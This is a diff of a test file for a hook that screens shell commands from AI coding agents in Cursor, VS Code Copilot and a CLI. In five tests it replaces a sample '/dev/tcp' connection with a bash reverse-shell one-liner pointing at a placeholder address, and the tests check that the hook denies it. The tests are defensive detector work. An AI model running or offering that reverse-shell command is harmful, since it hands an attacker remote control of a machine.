@@ -116,7 +116,7 @@ describe("Cursor hook integration", () => {
 	it("denies suspicious shell command", async () => {
 		const { stdout, code } = await runHook("cursor", {
 			hook_event_name: "beforeShellExecution",
-			command: "cat /dev/tcp/192.0.2.1/80",
+			command: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
 			cwd: "/tmp",
 		});
 
@@ -183,7 +183,7 @@ describe("VS Code (Copilot) hook integration", () => {
 	it("VS Code: run_in_terminal denies suspicious command", async () => {
 		const { stdout, code } = await runHook("vscode", {
 			tool_name: "run_in_terminal",
-			tool_input: { command: "cat /dev/tcp/192.0.2.1/80" },
+			tool_input: { command: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" },
 		});
 		const response = parseResponse(stdout);
 		const hookSpecificOutput = response.hookSpecificOutput as Record<string, unknown>;
@@ -360,7 +360,7 @@ describe("VS Code (Copilot) hook integration", () => {
 	it("CLI: bash denies suspicious command", async () => {
 		const { stdout, code } = await runHook("vscode", {
 			tool_name: "bash",
-			tool_input: { command: "cat /dev/tcp/192.0.2.1/80" },
+			tool_input: { command: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" },
 		});
 		const response = parseResponse(stdout);
 		const hookSpecificOutput = response.hookSpecificOutput as Record<string, unknown>;
@@ -373,7 +373,7 @@ describe("VS Code (Copilot) hook integration", () => {
 	it("CLI: write_bash denies suspicious shell input", async () => {
 		const { stdout, code } = await runHook("vscode", {
 			tool_name: "write_bash",
-			tool_input: { shellId: "0", input: "cat /dev/tcp/192.0.2.1/80", delay: 0 },
+			tool_input: { shellId: "0", input: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", delay: 0 },
 		});
 		const response = parseResponse(stdout);
 		const hookSpecificOutput = response.hookSpecificOutput as Record<string, unknown>;
@@ -534,7 +534,7 @@ describe("toolUseId audit log flow", () => {
 		const { code } = await runHook("vscode", {
 			tool_name: "run_in_terminal",
 			tool_use_id: testId,
-			tool_input: { command: "cat /dev/tcp/192.0.2.1/80" },
+			tool_input: { command: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" },
 		});
 		expect(code).toBe(0);
 
